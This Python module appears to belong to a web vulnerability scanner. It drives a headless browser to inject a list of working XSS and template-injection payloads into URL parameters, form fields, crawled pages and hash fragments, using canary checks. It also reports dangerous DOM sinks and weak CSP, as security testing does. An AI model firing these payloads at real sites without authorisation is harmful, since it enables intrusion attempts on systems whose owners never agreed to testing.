import asyncio
import json
import re
import uuid
import time
from urllib.parse import urlparse, urljoin, urlencode, parse_qs
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import (
    TimeoutException,
    StaleElementReferenceException,
    ElementNotInteractableException,
    WebDriverException,
)
from scanner.modules.base import BaseModule
from scanner.modules.browser_recon import create_driver
from scanner.models import Finding


class SeleniumXSSModule(BaseModule):
    name = "selenium_xss"
    phase = "simulation"
    description = "Selenium-based XSS hunter — DOM-based, reflected, and template injection detection via real browser execution"
    timeout = 180

    CANARY_PREFIX = "MSE_XSS_"

    PAYLOADS = [
        {
            "name": "Script Tag Injection",
            "template": '<script>window.__MSE_XSS="{canary}"</script>',
            "dom_check": "window.__MSE_XSS",
            "category": "reflected",
            "severity": "critical",
        },
        {
            "name": "IMG Onerror",
            "template": '<img src=x onerror="window.__MSE_XSS=\'{canary}\'">',
            "dom_check": "window.__MSE_XSS",
            "category": "reflected",
            "severity": "critical",
        },
        {
            "name": "SVG Onload",
            "template": '<svg/onload="window.__MSE_XSS=\'{canary}\'">',
            "dom_check": "window.__MSE_XSS",
            "category": "reflected",
            "severity": "critical",
        },
        {
            "name": "Event Handler Injection",
            "template": '" onfocus="window.__MSE_XSS=\'{canary}\'" autofocus="',
            "dom_check": "window.__MSE_XSS",
            "category": "reflected",
            "severity": "high",
        },
        {
            "name": "Body Onload",
            "template": '<body onload="window.__MSE_XSS=\'{canary}\'">',
            "dom_check": "window.__MSE_XSS",
            "category": "reflected",
            "severity": "critical",
        },
        {
            "name": "Angular Template Injection",
            "template": "{{constructor.constructor('window.__MSE_XSS=\"{canary}\"')()}}",
            "dom_check": "window.__MSE_XSS",
            "category": "template_injection",
            "severity": "critical",
        },
        {
            "name": "Vue Template Injection",
            "template": "${{\"constructor\"}}${{\"constructor\"}}('{canary}')()",
            "dom_check": None,
            "source_check": True,
            "category": "template_injection",
            "severity": "critical",
        },
        {
            "name": "SSTI Numeric",
            "template": "{{7*7}}",
            "dom_check": None,
            "source_check_value": "49",
            "category": "template_injection",
            "severity": "critical",
        },
        {
            "name": "ES6 Template Literal",
            "template": "${{{7}*{7}}}",
            "dom_check": None,
            "source_check_value": "49",
            "category": "template_injection",
            "severity": "high",
        },
        {
            "name": "JavaScript Protocol",
            "template": "javascript:void(document.title='{canary}')",
            "dom_check": None,
            "category": "dom_based",
            "severity": "high",
        },
        {
            "name": "Data URI HTML",
            "template": "data:text/html,<script>parent.window.__MSE_XSS='{canary}'</script>",
            "dom_check": "window.__MSE_XSS",
            "category": "dom_based",
            "severity": "high",
        },
        {
            "name": "Details Tag",
            "template": '<details open ontoggle="window.__MSE_XSS=\'{canary}\'">',
            "dom_check": "window.__MSE_XSS",
            "category": "reflected",
            "severity": "critical",
        },
    ]

    COMMON_PARAMS = ["q", "search", "query", "s", "keyword", "term", "input", "text",
                     "name", "value", "id", "page", "url", "redirect", "next", "ref",
                     "callback", "data", "msg", "message", "error", "title", "content"]

    async def execute(self, job) -> list:
        findings = []
        driver = None
        total_tests = 0
        xss_confirmed = 0

        try:
            self.log("Launching headless Chromium for XSS hunting...")
            driver = await asyncio.get_event_loop().run_in_executor(None, create_driver)
            self.log("Browser launched — XSS Hunter active", "success")

            self.log(f"Target: {job.base_url}")
            self.log(f"Payloads loaded: {len(self.PAYLOADS)} vectors")
            self.log(f"Parameter candidates: {len(self.COMMON_PARAMS)} common params")

            param_findings = await self._test_url_parameters(driver, job.base_url)
            findings.extend(param_findings)
            total_tests += len(self.COMMON_PARAMS) * min(5, len(self.PAYLOADS))
            xss_confirmed += len(param_findings)

            input_findings = await self._test_input_fields(driver, job.base_url)
            findings.extend(input_findings)
            total_tests += 1
            xss_confirmed += len(input_findings)

            crawl_findings = await self._crawl_and_test(driver, job.base_url)
            findings.extend(crawl_findings)
            xss_confirmed += len(crawl_findings)

            dom_findings = await self._test_dom_sinks(driver, job.base_url)
            findings.extend(dom_findings)
            xss_confirmed += len(dom_findings)

            console_findings = await self._analyze_console_errors(driver, job.base_url)
            findings.extend(console_findings)

            self.log(f"XSS Hunt complete — {xss_confirmed} confirmed XSS, {len(findings)} total findings, {total_tests}+ tests executed")
            self.telemetry(requestsAnalyzed=total_tests)

        except Exception as e:
            self.log(f"Selenium XSS Hunter error: {str(e)}", "error")

        finally:
            if driver:
                try:
                    await asyncio.get_event_loop().run_in_executor(None, driver.quit)
                    self.log("Browser closed")
                except Exception:
                    pass

        return findings

    def _generate_canary(self) -> str:
        return f"{self.CANARY_PREFIX}{uuid.uuid4().hex[:12]}"

    async def _check_xss_execution(self, driver, canary: str, payload_def: dict) -> dict:
        result = {"executed": False, "evidence": [], "console_errors": []}

        try:
            dom_check = payload_def.get("dom_check")
            if dom_check:
                try:
                    val = await asyncio.get_event_loop().run_in_executor(
                        None,
                        driver.execute_script,
                        f"return {dom_check}"
                    )
                    if val and canary in str(val):
                        result["executed"] = True
                        result["evidence"].append(f"DOM variable set: {dom_check} = {val}")
                except Exception:
                    pass

            source_check_value = payload_def.get("source_check_value")
            if source_check_value and not result["executed"]:
                page_source = driver.page_source
                payload_template = payload_def["template"]
                raw_payload = payload_template.replace("{canary}", canary)
                if source_check_value in page_source and raw_payload not in page_source:
                    result["executed"] = True
                    result["evidence"].append(f"Template evaluated: expected '{source_check_value}' found in rendered DOM")

            if payload_def.get("source_check") and not result["executed"]:
                page_source = driver.page_source
                if canary in page_source:
                    result["executed"] = True
                    result["evidence"].append(f"Canary '{canary}' reflected in rendered page source")

            if not result["executed"]:
                page_source = driver.page_source
                payload_template = payload_def["template"]
                raw_payload = payload_template.replace("{canary}", canary)
                for fragment in [raw_payload, canary]:
                    if fragment in page_source:
                        result["evidence"].append(f"Payload/canary reflected in page source (unexecuted)")

            try:
                console_logs = driver.get_log("browser")
                for log_entry in console_logs:
                    msg = log_entry.get("message", "")
                    level = log_entry.get("level", "")
                    if canary in msg:
                        result["executed"] = True
                        result["evidence"].append(f"Canary appeared in console: {msg[:200]}")
                    if level in ("SEVERE",) and any(kw in msg.lower() for kw in ["script", "xss", "csp", "unsafe-inline", "eval"]):
                        result["console_errors"].append(msg[:200])
            except Exception:
                pass

        except Exception as e:
            result["evidence"].append(f"Check error: {str(e)[:100]}")

        return result

    async def _test_url_parameters(self, driver, base_url: str) -> list:
        findings = []
        self.log("Phase 1: URL Parameter XSS Testing")
        self.log(f"Testing {len(self.COMMON_PARAMS)} common parameters × {min(5, len(self.PAYLOADS))} payloads")

        parsed = urlparse(base_url)
        base_no_query = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        existing_params = parse_qs(parsed.query)
        if existing_params:
            self.log(f"Existing URL params detected: {list(existing_params.keys())}")
            for param_name in existing_params:
                if param_name not in self.COMMON_PARAMS:
                    self.COMMON_PARAMS.insert(0, param_name)

        for param in self.COMMON_PARAMS:
            for payload_def in self.PAYLOADS[:5]:
                canary = self._generate_canary()
                raw_payload = payload_def["template"].replace("{canary}", canary)
                test_url = f"{base_no_query}?{urlencode({param: raw_payload})}"

                try:
                    await asyncio.get_event_loop().run_in_executor(None, driver.get, test_url)
                    await asyncio.sleep(2)

                    result = await self._check_xss_execution(driver, canary, payload_def)

                    if result["executed"]:
                        evidence_str = " | ".join(result["evidence"])
                        f = Finding(
                            severity=payload_def["severity"],
                            title=f"XSS Confirmed: {payload_def['name']} via ?{param}=",
                            description=(
                                f"Browser-confirmed XSS in URL parameter '{param}'. "
                                f"Vector: {payload_def['name']} ({payload_def['category']}). "
                                f"Evidence: {evidence_str}. "
                                f"Payload: {raw_payload[:80]}"
                            ),
                            phase=self.phase,
                            recommendation=(
                                "Implement context-aware output encoding. Use Content-Security-Policy headers. "
                                "Sanitize all user input before rendering in HTML/JS contexts."
                            ),
                            cvss_score=9.1 if payload_def["severity"] == "critical" else 7.5,
                            references=["https://owasp.org/www-community/attacks/xss/"],
                        )
                        findings.append(f)
                        self.finding(f.severity, f.title, f.description, f.recommendation, f.cvss_score)
                        self.asset("vulnerability", f"?{param}=", f"XSS: {payload_def['name']}", f.severity, "xss")
                        self.log(f"  [XSS CONFIRMED] {payload_def['name']} via ?{param}= — {evidence_str}", "error")
                    elif result["evidence"]:
                        self.log(f"  [REFLECT] {payload_def['name']} via ?{param}= — reflected but not executed", "warn")
                    elif result["console_errors"]:
                        self.log(f"  [CSP/JS] {payload_def['name']} via ?{param}= — blocked by CSP or JS error", "warn")

                    await asyncio.sleep(0.3)
                except TimeoutException:
                    self.log(f"  [TIMEOUT] ?{param}= with {payload_def['name']}", "warn")
                except Exception:
                    pass

        param_status = "CLEAN" if not findings else f"{len(findings)} XSS FOUND"
        self.log(f"Phase 1 complete — {param_status}")
        return findings

    async def _test_input_fields(self, driver, base_url: str) -> list:
        findings = []
        self.log("Phase 2: Input Field XSS Testing")

        try:
            await asyncio.get_event_loop().run_in_executor(None, driver.get, base_url)
            await asyncio.sleep(3)

            selectors = [
                'input[type="text"]',
                'input[type="search"]',
                'input:not([type])',
                'textarea',
                '[contenteditable="true"]',
                'input[type="email"]',
                'input[type="url"]',
            ]

            all_inputs = []
            for selector in selectors:
                try:
                    elements = driver.find_elements(By.CSS_SELECTOR, selector)
                    all_inputs.extend(elements)
                except Exception:
                    pass

            self.log(f"Found {len(all_inputs)} input fields to test")

            for idx, input_el in enumerate(all_inputs[:10]):
                for payload_def in self.PAYLOADS[:3]:
                    canary = self._generate_canary()
                    raw_payload = payload_def["template"].replace("{canary}", canary)

                    try:
                        tag = input_el.tag_name
                        is_content_editable = input_el.get_attribute("contenteditable") == "true"
                        input_type = input_el.get_attribute("type") or "text"
                        input_name = input_el.get_attribute("name") or input_el.get_attribute("id") or f"field_{idx}"

                        if is_content_editable:
                            await asyncio.get_event_loop().run_in_executor(
                                None, lambda: (input_el.click(), input_el.send_keys(raw_payload))
                            )
                        else:
                            await asyncio.get_event_loop().run_in_executor(
                                None, lambda: (input_el.clear(), input_el.send_keys(raw_payload))
                            )

                        try:
                            form = input_el.find_element(By.XPATH, "./ancestor::form")
                            submit_btns = form.find_elements(By.CSS_SELECTOR, 'button[type="submit"], input[type="submit"]')
                            if submit_btns:
                                await asyncio.get_event_loop().run_in_executor(None, submit_btns[0].click)
                            else:
                                await asyncio.get_event_loop().run_in_executor(
                                    None, lambda: input_el.send_keys(Keys.RETURN)
                                )
                        except Exception:
                            await asyncio.get_event_loop().run_in_executor(
                                None, lambda: input_el.send_keys(Keys.RETURN)
                            )

                        await asyncio.sleep(2)

                        result = await self._check_xss_execution(driver, canary, payload_def)

                        if result["executed"]:
                            evidence_str = " | ".join(result["evidence"])
                            f = Finding(
                                severity=payload_def["severity"],
                                title=f"XSS Confirmed: {payload_def['name']} in input '{input_name}'",
                                description=(
                                    f"Browser-confirmed XSS via input field '{input_name}' (type={input_type}). "
                                    f"Vector: {payload_def['name']} ({payload_def['category']}). "
                                    f"Evidence: {evidence_str}. "
                                    f"The field accepts and renders unsanitized HTML/JavaScript."
                                ),
                                phase=self.phase,
                                recommendation=(
                                    "Sanitize input on both client and server side. "
                                    "Use DOMPurify or equivalent for client-side rendering. "
                                    "Implement CSP headers to prevent inline script execution."
                                ),
                                cvss_score=9.1 if payload_def["severity"] == "critical" else 7.5,
                                references=["https://owasp.org/www-community/attacks/xss/"],
                            )
                            findings.append(f)
                            self.finding(f.severity, f.title, f.description, f.recommendation, f.cvss_score)
                            self.asset("vulnerability", input_name, f"Input XSS: {payload_def['name']}", f.severity, "xss")
                            self.log(f"  [XSS CONFIRMED] Field '{input_name}' — {payload_def['name']}", "error")
                            break

                        await asyncio.get_event_loop().run_in_executor(None, driver.get, base_url)
                        await asyncio.sleep(1)

                    except (StaleElementReferenceException, ElementNotInteractableException):
                        break
                    except Exception:
                        pass

        except Exception as e:
            self.log(f"Input field testing error: {str(e)}", "error")

        field_status = "CLEAN" if not findings else f"{len(findings)} XSS FOUND"
        self.log(f"Phase 2 complete — {field_status}")
        return findings

    async def _crawl_and_test(self, driver, start_url: str) -> list:
        findings = []
        visited = set()
        to_visit = [start_url]
        max_pages = 15
        pages_tested = 0

        self.log("Phase 3: Crawl & Hunt — discovering pages and testing XSS")

        parsed_start = urlparse(start_url)
        base_domain = parsed_start.netloc

        while to_visit and pages_tested < max_pages:
            url = to_visit.pop(0)
            if url in visited:
                continue
            visited.add(url)
            pages_tested += 1

            try:
                await asyncio.get_event_loop().run_in_executor(None, driver.get, url)
                await asyncio.sleep(2)

                links = driver.find_elements(By.TAG_NAME, "a")
                for link in links:
                    try:
                        href = link.get_attribute("href")
                        if href and base_domain in href and href not in visited:
                            parsed_href = urlparse(href)
                            if parsed_href.scheme in ("http", "https"):
                                to_visit.append(href)
                    except StaleElementReferenceException:
                        pass

                page_params = parse_qs(urlparse(url).query)
                if page_params:
                    for param_name in page_params:
                        for payload_def in self.PAYLOADS[:2]:
                            canary = self._generate_canary()
                            raw_payload = payload_def["template"].replace("{canary}", canary)
                            test_url = f"{url.split('?')[0]}?{urlencode({param_name: raw_payload})}"

                            try:
                                await asyncio.get_event_loop().run_in_executor(None, driver.get, test_url)
                                await asyncio.sleep(2)

                                result = await self._check_xss_execution(driver, canary, payload_def)
                                if result["executed"]:
                                    evidence_str = " | ".join(result["evidence"])
                                    f = Finding(
                                        severity=payload_def["severity"],
                                        title=f"XSS Confirmed: {payload_def['name']} on {urlparse(url).path}?{param_name}=",
                                        description=(
                                            f"Browser-confirmed XSS found during crawl. "
                                            f"Page: {url}. Parameter: {param_name}. "
                                            f"Vector: {payload_def['name']}. Evidence: {evidence_str}"
                                        ),
                                        phase=self.phase,
                                        recommendation="Sanitize all URL parameters before rendering. Implement CSP.",
                                        cvss_score=9.1 if payload_def["severity"] == "critical" else 7.5,
                                        references=["https://owasp.org/www-community/attacks/xss/"],
                                    )
                                    findings.append(f)
                                    self.finding(f.severity, f.title, f.description, f.recommendation, f.cvss_score)
                                    self.log(f"  [XSS CONFIRMED] Crawled page {urlparse(url).path}?{param_name}= — {payload_def['name']}", "error")
                                    break
                            except Exception:
                                pass

            except TimeoutException:
                self.log(f"  [TIMEOUT] {url}", "warn")
            except Exception:
                pass

        self.log(f"Phase 3 complete — crawled {pages_tested} pages, {len(findings)} XSS found")
        return findings

    async def _test_dom_sinks(self, driver, base_url: str) -> list:
        findings = []
        self.log("Phase 4: DOM Sink Analysis")

        try:
            await asyncio.get_event_loop().run_in_executor(None, driver.get, base_url)
            await asyncio.sleep(3)

            dom_sink_script = """
            var sinks = [];
            var dangerous = [
                'innerHTML', 'outerHTML', 'document.write', 'document.writeln',
                'eval', 'setTimeout', 'setInterval', 'Function',
                'insertAdjacentHTML', 'srcdoc'
            ];

            var scripts = document.querySelectorAll('script');
            for (var i = 0; i < scripts.length; i++) {
                var content = scripts[i].textContent || '';
                for (var j = 0; j < dangerous.length; j++) {
                    if (content.indexOf(dangerous[j]) !== -1) {
                        var context = content.substring(
                            Math.max(0, content.indexOf(dangerous[j]) - 40),
                            Math.min(content.length, content.indexOf(dangerous[j]) + dangerous[j].length + 40)
                        );
                        sinks.push({
                            sink: dangerous[j],
                            context: context,
                            scriptIndex: i,
                            src: scripts[i].src || 'inline'
                        });
                    }
                }
            }

            var hashValue = window.location.hash;
            var searchValue = window.location.search;
            if (hashValue || searchValue) {
                sinks.push({
                    sink: 'location.hash/search',
                    context: 'URL contains fragment/query: ' + hashValue + searchValue,
                    scriptIndex: -1,
                    src: 'url'
                });
            }

            return sinks;
            """

            sinks = await asyncio.get_event_loop().run_in_executor(
                None, driver.execute_script, dom_sink_script
            )

            if sinks:
                self.log(f"Found {len(sinks)} potential DOM sinks")

                high_risk_sinks = [s for s in sinks if s["sink"] in ("innerHTML", "outerHTML", "document.write", "eval")]
                medium_risk_sinks = [s for s in sinks if s["sink"] not in ("innerHTML", "outerHTML", "document.write", "eval")]

                if high_risk_sinks:
                    sink_summary = ", ".join(set(s["sink"] for s in high_risk_sinks))
                    contexts = [f"{s['sink']} in {s['src']}: ...{s['context'][:60]}..." for s in high_risk_sinks[:5]]
                    f = Finding(
                        severity="high",
                        title=f"Dangerous DOM Sinks Detected ({len(high_risk_sinks)} instances)",
                        description=(
                            f"High-risk DOM manipulation patterns found: {sink_summary}. "
                            f"These sinks can lead to DOM-based XSS if user-controlled data flows into them. "
                            f"Instances: {'; '.join(contexts)}"
                        ),
                        phase=self.phase,
                        recommendation=(
                            "Replace innerHTML with textContent. Avoid eval() and document.write(). "
                            "Use DOMPurify to sanitize any dynamic HTML insertion. "
                            "Implement Trusted Types CSP directive."
                        ),
                        cvss_score=7.5,
                        references=["https://owasp.org/www-community/attacks/DOM_Based_XSS"],
                    )
                    findings.append(f)
                    self.finding(f.severity, f.title, f.description, f.recommendation, f.cvss_score)
                    for s in high_risk_sinks[:3]:
                        self.log(f"  [HIGH] {s['sink']} in {s['src']}: {s['context'][:80]}", "error")

                if medium_risk_sinks:
                    for s in medium_risk_sinks[:3]:
                        self.log(f"  [MEDIUM] {s['sink']} in {s['src']}: {s['context'][:80]}", "warn")
            else:
                self.log("No dangerous DOM sinks detected", "success")

            hash_payloads = [
                "#<img src=x onerror=window.__MSE_XSS='hash_xss'>",
                "#javascript:void(0)",
                "#{{7*7}}",
            ]

            for hp in hash_payloads:
                canary = self._generate_canary()
                test_url = f"{base_url}{hp.replace('hash_xss', canary)}"
                try:
                    await asyncio.get_event_loop().run_in_executor(None, driver.get, test_url)
                    await asyncio.sleep(2)

                    val = await asyncio.get_event_loop().run_in_executor(
                        None, driver.execute_script, "return window.__MSE_XSS || null"
                    )
                    if val and canary in str(val):
                        f = Finding(
                            severity="critical",
                            title="DOM XSS via URL Fragment (hash)",
                            description=(
                                f"XSS triggered via URL hash fragment. "
                                f"The application processes location.hash without sanitization. "
                                f"Payload: {hp}"
                            ),
                            phase=self.phase,
                            recommendation="Never use location.hash in innerHTML or eval. Sanitize all hash-based routing.",
                            cvss_score=9.1,
                            references=["https://owasp.org/www-community/attacks/DOM_Based_XSS"],
                        )
                        findings.append(f)
                        self.finding(f.severity, f.title, f.description, f.recommendation, f.cvss_score)
                        self.log(f"  [XSS CONFIRMED] DOM XSS via hash: {hp}", "error")
                        break
                except Exception:
                    pass

        except Exception as e:
            self.log(f"DOM sink analysis error: {str(e)}", "error")

        self.log(f"Phase 4 complete — {len(findings)} DOM findings")
        return findings

    async def _analyze_console_errors(self, driver, base_url: str) -> list:
        findings = []
        self.log("Phase 5: Console Error & CSP Analysis")

        try:
            await asyncio.get_event_loop().run_in_executor(None, driver.get, base_url)
            await asyncio.sleep(3)

            try:
                console_logs = driver.get_log("browser")
            except Exception:
                console_logs = []

            csp_violations = []
            js_errors = []
            security_warnings = []

            for log_entry in console_logs:
                msg = log_entry.get("message", "")
                level = log_entry.get("level", "")

                if "content security policy" in msg.lower() or "csp" in msg.lower():
                    csp_violations.append(msg[:200])
                elif "unsafe-inline" in msg.lower() or "unsafe-eval" in msg.lower():
                    csp_violations.append(msg[:200])
                elif level == "SEVERE" and any(kw in msg.lower() for kw in ["script", "cross-origin", "mixed content"]):
                    security_warnings.append(msg[:200])
                elif level == "SEVERE":
                    js_errors.append(msg[:200])

            if csp_violations:
                self.log(f"CSP violations detected: {len(csp_violations)}", "warn")
                for v in csp_violations[:3]:
                    self.log(f"  CSP: {v[:120]}", "warn")
            else:
                csp_check = await asyncio.get_event_loop().run_in_executor(
                    None,
                    driver.execute_script,
                    """
                    var meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
                    return meta ? meta.getAttribute('content') : null;
                    """
                )

                resp_headers = {}
                try:
                    import httpx
                    async with httpx.AsyncClient(timeout=10, verify=False) as client:
                        resp = await client.head(base_url)
                        resp_headers = dict(resp.headers)
                except Exception:
                    pass

                csp_header = resp_headers.get("content-security-policy", "")

                if not csp_check and not csp_header:
                    f = Finding(
                        severity="medium",
                        title="No Content-Security-Policy Detected",
                        description=(
                            "The application does not set a Content-Security-Policy header or meta tag. "
                            "Without CSP, the browser cannot prevent inline script execution, "
                            "making XSS attacks significantly more impactful."
                        ),
                        phase=self.phase,
                        recommendation=(
                            "Implement a strict CSP: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; "
                            "img-src 'self' data:; object-src 'none'; base-uri 'self';"
                        ),
                        cvss_score=5.3,
                    )
                    findings.append(f)
                    self.finding(f.severity, f.title, f.description, f.recommendation, f.cvss_score)
                    self.log("  [WARN] No CSP header detected — XSS impact amplified", "warn")
                elif csp_header:
                    weak_directives = []
                    if "'unsafe-inline'" in csp_header:
                        weak_directives.append("unsafe-inline allowed")
                    if "'unsafe-eval'" in csp_header:
                        weak_directives.append("unsafe-eval allowed")
                    if "data:" in csp_header:
                        weak_directives.append("data: URI allowed")

                    if weak_directives:
                        f = Finding(
                            severity="medium",
                            title=f"Weak CSP Configuration ({len(weak_directives)} issues)",
                            description=(
                                f"CSP is set but has weaknesses: {', '.join(weak_directives)}. "
                                f"Header: {csp_header[:200]}"
                            ),
                            phase=self.phase,
                            recommendation="Remove unsafe-inline and unsafe-eval from CSP. Use nonces or hashes for inline scripts.",
                            cvss_score=5.3,
                        )
                        findings.append(f)
                        self.finding(f.severity, f.title, f.description, f.recommendation, f.cvss_score)
                        self.log(f"  [WARN] Weak CSP: {', '.join(weak_directives)}", "warn")
                    else:
                        self.log("  [PASS] CSP appears properly configured", "success")

            if security_warnings:
                self.log(f"Security-related console warnings: {len(security_warnings)}", "warn")

        except Exception as e:
            self.log(f"Console analysis error: {str(e)}", "error")

        self.log(f"Phase 5 complete — {len(findings)} CSP/console findings")
        return findings
